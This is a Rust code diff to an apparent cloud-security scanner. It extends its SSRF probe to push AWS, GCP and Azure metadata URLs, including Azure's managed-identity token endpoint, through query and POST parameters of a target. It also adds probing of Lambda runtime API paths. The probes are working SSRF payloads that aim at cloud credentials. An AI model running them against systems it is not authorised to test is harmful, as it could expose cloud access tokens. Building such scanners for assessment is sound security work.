@@ -2,8 +2,9 @@
 //! and SaaS APIs reachable from the target. No simulated findings.
 
 use crate::engine_probes::{
-    detect_secrets, dns_txt, empty_ok, extract_host, finding_with_probe_depth, header_value,
-    http_client, http_get, normalize_url, probe_paths_concurrent, DEFAULT_PROBE_CONCURRENCY,
+    detect_secrets, dns_ns, dns_txt, empty_ok, extract_host, finding_with_probe_depth, header_value,
+    http_client, http_get, http_post_json, normalize_url, probe_paths_concurrent,
+    DEFAULT_PROBE_CONCURRENCY,
 };
 use crate::engine_result::{print_result, EngineResult};
 use serde_json::Value;
@@ -37,7 +38,7 @@ macro_rules! cli_wrapper {
     };
 }
 
-// Probe SSRF-forwarded cloud metadata via target.
+// Probe SSRF-forwarded cloud metadata via target (GET query + POST body).
 async fn try_ssrf_metadata(target: &str) -> Vec<Value> {
     let client = http_client().await;
     let base = normalize_url(target);
@@ -45,10 +46,11 @@ async fn try_ssrf_metadata(target: &str) -> Vec<Value> {
         "http://169.254.169.254/latest/meta-data/",
         "http://metadata.google.internal/computeMetadata/v1/",
         "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
     ];
     let mut findings = Vec::new();
     for meta in metadata_urls.iter() {
-        for q in ["url", "image", "callback", "redirect_uri"] {
+        for q in ["url", "image", "callback", "redirect_uri", "target", "fetch"] {
             let url = format!(
                 "{}/?{}={}",
                 base.trim_end_matches('/'),
@@ -59,6 +61,7 @@ async fn try_ssrf_metadata(target: &str) -> Vec<Value> {
                 if p.body.contains("ami-id")
                     || p.body.contains("computeMetadata")
                     || p.body.contains("instanceId")
+                    || p.body.contains("access_token")
                 {
                     findings.push(cloud_finding(
                         "cloud_metadata_ssrf",
@@ -67,6 +70,26 @@ async fn try_ssrf_metadata(target: &str) -> Vec<Value> {
                         "T1552.005",
                         &format!(
                             "?{}={} on {} returned cloud-metadata content.",
+                            q, meta, p.final_url
+                        ),
+                        target,
+                    ));
+                }
+            }
+            let post_payload = serde_json::json!({ q: meta });
+            if let Some(p) = http_post_json(&client, &url, &post_payload).await {
+                if p.body.contains("ami-id")
+                    || p.body.contains("computeMetadata")
+                    || p.body.contains("instanceId")
+                    || p.body.contains("access_token")
+                {
+                    findings.push(cloud_finding(
+                        "cloud_metadata_ssrf",
+                        "Cloud metadata reflected via POST SSRF body",
+                        "critical",
+                        "T1552.005",
+                        &format!(
+                            "POST body {}={} on {} returned cloud-metadata content.",
                             q, meta, p.final_url
                         ),
                         target,
@@ -188,6 +211,7 @@ pub async fn run_lambda_escape_result(target: &str) -> EngineResult {
     if let Some(p) = http_get(&client, &base).await {
         if header_value(&p.headers, "x-amzn-requestid").is_some()
             || header_value(&p.headers, "x-amz-apigw-id").is_some()
+            || header_value(&p.headers, "x-amzn-trace-id").is_some()
         {
             findings.push(cloud_finding(
                 "lambda_escape",
@@ -202,12 +226,41 @@ pub async fn run_lambda_escape_result(target: &str) -> EngineResult {
             ));
         }
     }
+    let lambda_paths = [
+        "/2015-03-31/functions/",
+        "/runtime/invocation/next",
+        "/_lambda/warmup",
+        "/aws/lambda",
+        "/.aws/lambda",
+    ];
+    let probes = probe_paths_concurrent(&client, &base, &lambda_paths, DEFAULT_PROBE_CONCURRENCY).await;
+    for p in probes {
+        if p.status < 500
+            && (p.body.contains("FunctionName")
+                || p.body.contains("Runtime")
+                || p.body.contains("lambda")
+                || p.headers.iter().any(|(k, _)| k.eq_ignore_ascii_case("x-amzn-requestid")))
+        {
+            findings.push(cloud_finding(
+                "lambda_escape",
+                "Lambda runtime API surface exposed",
+                "high",
+                "T1610",
+                &format!(
+                    "{} ({}) — verify IAM role scoping and runtime API isolation.",
+                    p.final_url, p.status
+                ),
+                target,
+            ));
+            break;
+        }
+    }
     if findings.is_empty() {
         empty_ok("lambda_escape", target)
     } else {
         EngineResult::ok(
             findings.clone(),
-            format!("lambda_escape: {}", findings.len()),
+            format!("lambda_escape: {} finding(s)", findings.len()),
         )
     }
 }
